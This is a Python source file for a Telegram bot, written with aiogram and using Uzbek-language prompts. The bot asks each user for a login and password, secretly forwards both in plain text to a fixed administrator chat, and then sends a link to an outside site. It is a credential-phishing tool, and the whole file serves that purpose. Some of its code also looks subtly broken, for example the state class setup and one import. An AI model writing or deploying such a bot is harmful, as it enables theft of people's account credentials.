import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher import filters
from aiogram.dispatcher import State
from aiogram.utils import executor

API_TOKEN = 'YOUR_API_TOKEN'
ADMIN_ID = 'YOUR_ADMIN_CHAT_ID'

# Logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Define states
class Form(State):
    login = State()
    password = State()

@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    await message.reply("Iltimos, loginni kiriting:")
    await Form.login.set()

@dp.message_handler(state=Form.login)
async def process_login(message: types.Message, state: FSMContext):
    await state.update_data(login=message.text)
    await message.reply("Iltimos, parolni kiriting:")
    await Form.next()

@dp.message_handler(state=Form.password)
async def process_password(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    login = user_data['login']
    password = message.text

    # Adminga login va parolni yuborish
    await bot.send_message(ADMIN_ID, f"Foydalanuvchi login: {login}\nFoydalanuvchi parol: {password}")

    # Linkni yuborish
    await message.reply("Sizga link yuborildi: [uyyyy.com](https://uyyyy.com)", parse_mode='Markdown')

    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
